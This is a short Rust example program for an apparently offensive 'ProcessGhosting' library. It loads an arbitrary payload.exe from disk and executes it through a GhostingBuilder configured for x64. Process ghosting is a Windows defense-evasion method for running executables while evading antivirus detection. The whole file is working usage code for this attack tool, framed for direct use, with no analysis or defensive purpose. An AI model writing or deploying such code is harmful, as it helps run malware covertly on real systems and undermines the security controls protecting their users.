//! Basic usage example for ProcessGhosting library
//! Author: BlackTechX

use process_ghosting::{GhostingBuilder, init};

fn main() {
    // Initialize library (prints banner)
    init();

    println!("[*] Basic Usage Example\n");

    // Read payload from file
    let payload_path = "payload.exe";
    
    match std::fs::read(payload_path) {
        Ok(payload) => {
            println!("[+] Loaded payload: {} bytes", payload.len());
            
            // Execute ghosting
            let result = GhostingBuilder::new(&payload)
                .x64()              // Target x64 architecture
                .with_logging()     // Enable verbose output
                .execute();

            match result {
                Ok(_) => println!("\n[+] Process ghosting completed successfully!"),
                Err(e) => eprintln!("\n[-] Process ghosting failed: {}", e),
            }
        }
        Err(e) => {
            eprintln!("[-] Failed to read payload file '{}': {}", payload_path, e);
            eprintln!("    Please provide a valid PE executable.");
        }
    }
}